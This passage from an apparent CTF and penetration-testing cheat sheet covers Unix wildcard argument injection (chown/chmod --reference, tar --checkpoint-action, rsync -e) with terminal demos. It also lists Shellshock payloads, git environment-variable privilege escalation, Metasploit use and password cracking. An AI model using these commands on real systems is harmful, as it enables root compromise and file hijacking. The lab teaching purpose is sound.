  And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

   -Z user 
   --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

   This behavior can also be enabled by default at compile time.


More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.


Unix Wildcards
--------------

The below text is directly from the `here <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>`_.

Chown file reference trick (file owner hijacking)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.

:: 

  [root@defensecode public]# ls -al
  total 52
  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
  drwx------. 22 user user 4096 Oct 28 17:34 ..
  -rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
  -rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
  -rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
  -rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
  -rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
  -rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
  -rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
  -rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
  -rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
  -rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
  -rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
  -rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php

Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.

:: 

   [root@defensecode public]# chown -R nobody:nobody \*.php

Let's see who owns files now...

:: 

  root@defensecode public]# ls -al
  total 52
  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
  drwx------. 22 user user 4096 Oct 28 17:34 ..
  -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
  -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
  -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
  -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
  -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
  -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
  -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
  -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
  -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
  -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
  -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
  -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php

Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.

:: 

  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.

Let's check chown manual page (man chown):

:: 

   --reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values

So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)

To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument	to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.

Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.


Chmod file reference trick
^^^^^^^^^^^^^^^^^^^^^^^^^^

Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):

:: 

  --reference=RFILE    :   use RFILE's mode instead of MODE values

Example is presented below.

:: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php

Superuser will now try to set mode 000 on all files.

:: 

  [root@defensecode public]# chmod 000 *

Let's check permissions on files...

:: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
    -rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
    -rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
    -rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
    -rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
    -rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
    -rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
    -rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php

What happened? Instead of 000, all files are now set to mode 777 because of the '--reference' option supplied through file name..Once again,file .drf.php owned by user 'leon' with mode 777 was used as reference file and since --reference option is supplied, all files will be set to mode 777. Beside just --reference option, attacker can also create another file with '-R' filename, to change file permissions on files in	all subdirectories recursively.
   

Tar arbitrary command execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  
Previous example is nice example of file ownership hijacking. Now, let's go to even more interesting stuff like arbitrary command execution. 		Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:

:: 

    [root@defensecode public]# tar cvvf archive.tar *

So, what's the problem with 'tar'? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let's check tar manual page (man tar):

:: 

    --checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
    --checkpoint-action=ACTION : execute ACTION on each checkpoint

There is '--checkpoint-action' option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

Check the following directory:

:: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

Now, for example, root user wants to create archive of all files in current directory.

:: 

    [root@defensecode public]# tar cf archive.tar *
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command execution under root privileges. Once again, there are few files created by user 'leon'.

:: 

    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

  Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.

:: 

    [root@defensecode public]# cat shell.sh
    /usr/bin/id

So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the 'root' account above.
   

Rsync arbitrary command execution
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very common on Unix systems. If we check 'rsync' manual page, we can again find options that can be abused for arbitrary command execution.

Rsync manual: "You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote."

Interesting rsync option from manual:

:: 

  -e, --rsh=COMMAND       specify the remote shell to use
  --rsync-path=PROGRAM    specify the rsync to run on remote machine			

Let's abuse one example directly from the 'rsync' manual page. Following example will copy all C files in local directory to a remote host 'foo' in '/src' directory.

:: 

  # rsync -t *.c foo:src/


Directory content:

:: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

Now root will try to copy all C files to the remote server.

:: 

    [root@defensecode public]# rsync -t *.c foo:src/

    rsync: connection unexpectedly closed (0 bytes received so far) [sender]
    rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]

Let's see what happened...

:: 

    [root@defensecode public]# ls -al
    total 76
    drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
    -rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
    -rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
    -rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
    -rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
    -rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
    -rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
    -rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
    -rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

There were two files owned by user 'leon', as listed below.

:: 

    -rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
    -rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c

After 'rsync' execution, new file shell\_output.txt whose owner is root is created in same directory.

:: 

    -rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt

If we check its content, following data is found.

:: 

    [root@defensecode public]# cat shell_output.txt
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Trick is that because of the '\*.c' wildcard, 'rsync' got '-e sh shell.c' option on command line, and shell.c will be executed upon'rsync' start. Content of shell.c is presented below.

:: 

    [root@defensecode public]# cat shell.c
    /usr/bin/id > shell_output.txt

Tips and Tricks
===============

FTP Services
------------

If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)

::

  wget -rq ftp://IP --ftp-user=username --ftp-password=password

SSH
---

ssh_config
^^^^^^^^^^
If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.

::

   ## Tighten security after security incident 
   ## root never gets to log in remotely PermitRootLogin no 
   ## Eugene & Margo can SSH in, no-one else allowed 
   AllowUsers eugene margo 
   ## SSH keys only but margo can use a password 
   Match user margo 
   PasswordAuthentication yes 	
   ## End tighten security

SSH as SOCKS Proxy
^^^^^^^^^^^^^^^^^^
We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.

:: 

  ssh -D localhost:9050 user@host

  -D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.

and 
	
:: 
	
  proxychains4 remmina

HTTP
----

First things
^^^^^^^^^^^^

* View Source of the web-page ( Ctrl+U).
* Inspect element of the web-page ( F12 ).
* See if there is any hint in the title of the web page. ( example: /Magic ).
* If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.

htaccess - UserAgent
^^^^^^^^^^^^^^^^^^^^
When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file

:: 

   cat .htaccess 
   BrowserMatchNoCase "iPhone" allowed

   Order Deny,Allow 
   Deny from ALL 
   Allow from env=allowed 
   ErrorDocument 403 “<H1>Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>”

CGI-BIN Shellshock
^^^^^^^^^^^^^^^^^^
To understand shellshock few blogs can be referred such as `ShellShocked – A quick demo of how easy it is to exploit <https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/>`, `Inside Shellshock: How hackers are using it to exploit systems <https://blog.cloudflare.com/inside-shellshock/>`_

::

  curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat

 It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started <http://www.team2053.org/docs/bashcgi/gettingstarted.html>`_. Also the most important lines in this file are:

::

  echo "Content-type: text/html"
  echo ""
 
These two lines tell your browser that the rest of the content comming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn't understand that it is HTML!

**Shellshock Local Privilege Esclation**

Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.

::

  sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary

Shellshock also affects DHCP as mentioned `Shellshock DHCP RCE Proof of Concept <https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/>`_ There's a metasploit module named "Dhclient Bash Environment Variable Injection (Shellshock)" for this.

XSS/ HTML Injection
^^^^^^^^^^^^^^^^^^^

The below will redirect the page to google.com

::
 
  <META http-equiv=“refresh” content=“0;URL=http://www.google.com”>

curl
^^^^

:: 

    -k, --insecure
    (SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
    This makes all connections considered "insecure" fail unless -k, --insecure is used.

    -I, --head
    (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.

HTTP Referer
^^^^^^^^^^^^

The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.

::
   
  Referer: <url>

  <url> An absolute or partial address of the previous web page from which a link to the currently requested page was followed. URL fragments (i.e. "#section") are not included.

Data-URI
^^^^^^^^^
`Basics of HTTP Data URI <https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics\_of\_HTTP/Data\_URIs>`_

Login-Pages
^^^^^^^^^^^
To test login pages, we may use burpsuite intruder and check for different length of response.

Delete Tags
^^^^^^^^^^^
Delete all lines between tags including tags:

::
   
  sed '/<tag>/,/<\/tag>/d' input.txt

.. Tip :: Useful when you are accessing the webpage using curl and their's LFI and you want to remove the html/ body tags.

HTTP 404 Custom Page
^^^^^^^^^^^^^^^^^^^^
Sometimes, it's a good idea to look at 404 custom page also. There might be some information store.d

run-parts
---------

run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.

:: 

  run-parts /etc/cron.daily

Sudoers file
------------

If the sudoers file contains: 
	
:: 

  secure\_path 
  Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment 	variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group option are not affected by secure\_path. This option is not set by default.

  env\_reset If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO\_\* variables. Any variables in the caller's environment that match the env\_keep and env\_check lists are then added, followed by any variables present in the file specified by the env\_file option (if any). The contents of the env\_keep and env\_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure\_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

  mail\_badpass Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail\_all\_cmnds, mail\_always, mail\_no\_host, mail\_no\_perms or mail\_no\_user flags are set, this flag will have no effect. This flag is off by default.

Docker Security
---------------

Any user who is part of the docker group should also be considered root. Read `Using the docker command to root the host <http://reventlov.com/advisories/using-the-docker-command-to-root-the-host>`_ Older version of docker were vulnerable to Docker breakout. More details at `Shocker / Docker Breakout PoC <https://github.com/gabrtv/shocker>`_


Java keystore file
------------------

Refer `Java Keytool essentials working with java keystores <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores>`_ and `openssl essentials working with ssl certificates private keys and csrs <https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>`_

Cracking MD5 Hashes
-------------------

Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_

Steghide
--------
Looking for hidden text in the images? Utilize steghide

::

  steghide version 0.5.1

  the first argument must be one of the following:
  embed, --embed          embed data
  extract, --extract      extract data
  info, --info            display information about a cover- or stego-file
  info <filename>       display information about <filename>
  encinfo, --encinfo      display a list of supported encryption algorithms
  version, --version      display version information
  license, --license      display steghide's license
  help, --help            display this usage information

Git client Privilege Escalation
--------------------------------
Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer `12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial <https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial>`_

In one of write-up, `Nicolas Surribas <http://devloop.users.sourceforge.net/>`_ has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.

GIT_SSH
^^^^^^^

If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).

::

  echo '#!/bin/bash' > cmd
  echo 'cp /root/flag.txt /tmp' >> cmd
  echo 'chmod 777 /tmp/flag.txt' >> cmd
  GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)

  or

  echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh

  where priv is binary compiled from suid.c

This basically changes the command from

::

  trace: built-in: git 'clone' 'ssh://root@sokar-dev:/root/secret-project' '/mnt/secret-project/'

to

::

  trace: run_command: '/home/apophis/ssh' 'root@sokar-dev' 'git-upload-pack '\''/root/secret-project'\'''

GIT_TEMPLATE_DIR
^^^^^^^^^^^^^^^^^
Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer `Git-init <https://git-scm.com/docs/git-init>`_ 

::

  cp -r /usr/share/git-core/templates/ mytemplates
  cd mytemplates/hooks
  echo '#!/bin/bash' > post-checkout
  echo 'cp /root/flag /tmp/flag2' >> post-checkout
  echo 'chown username.username /tmp/flag2' >> post-checkout
  chmod +x post-checkout
  cd ../..
  GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)


Metasploit shell upgrade
------------------------

In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u

:: 

   sessions -h
   Usage: sessions [options]
   
   Active session manipulation and interaction.

   OPTIONS:

   -u <opt>  Upgrade a shell to a meterpreter session on many platforms

Password Protected File
------------------------
	  
ZIP File
^^^^^^^^

run fcrackzip

:: 

    fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

    -D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
    -p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
    -u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.

rar2john
^^^^^^^^
We can get the password hash of a password protected rar file by using rar2john

:: 

    [root:~/Downloads]# rar2john crocs.rar
    file name: artwork.jpg
    crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg

Truecrypt Files
---------------

If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.

:: 

  truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>

and Veracrypt or cryptsetup to open the file.

::

  cryptsetup open --type tcrypt <Truecrypt> <MountName>


Others
------
* It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.

* If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

* Identification of OS:
	
 :: 

  cat /etc/os-release

  NAME="Ubuntu" VERSION="16.04 LTS (Xenial Xerus)" ID=ubuntu
  ID\_LIKE=debian PRETTY\_NAME="Ubuntu 16.04 LTS" VERSION\_ID="16.04"
  HOME\_URL="http://www.ubuntu.com/"
  SUPPORT\_URL="http://help.ubuntu.com/"
  BUG\_REPORT\_URL="http://bugs.launchpad.net/ubuntu/"
  UBUNTU\_CODENAME=xenial

* Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).

 .. ToDo ::  Mention examples for IPv6 connect


* Port 139 Open

 :: 

   smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Sharename       Type      Comment
   ---------       ----      -------
   print$          Disk      Printer Drivers
   kathy           Disk      Fred, What are we doing here?
   tmp             Disk      All temporary files should be stored here
   IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Server               Comment
   ---------            -------
   RED                  red server (Samba, Ubuntu)

   Workgroup            Master
   ---------            -------
   WORKGROUP            RED

   -N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
   -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you aretrying to reach a host on another network.


 If you want to access the share you might want to type

 :: 

   smbclient \\\\IP\\share\_name

 So, in the above example, it would be

 ::

   smbclient \\\\192.168.1.2\\kathy

 If port 139 is open, also run enum4linux, may be it would help get the user list
    
    


* Port 69 UDP:

  TFTP

  :: 

   get or put file

	    
* Ruby Best way to get quoted words / phrases out of the text

  :: 

    text.scan(/"([^"]\*)"/)

    
* Convert all text in a file from UPPER to lowercase
	
  :: 

   tr '[:upper:]' '[:lower:]' < input.txt > output.txt


* Remove lines longer than x or shorter than x

  :: 

   awk 'length($0)>x' filename or awk 'length($0)

* Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.

 
* Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.

* If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.

 :: 

   13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
   13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
   13:06:21.991250 Authentication (Open System)-1: Successful
   13:06:21.992274 Authentication (Open System)-1: Successful
   13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.992795 Authentication (Open System)-2: 
   13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
   13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
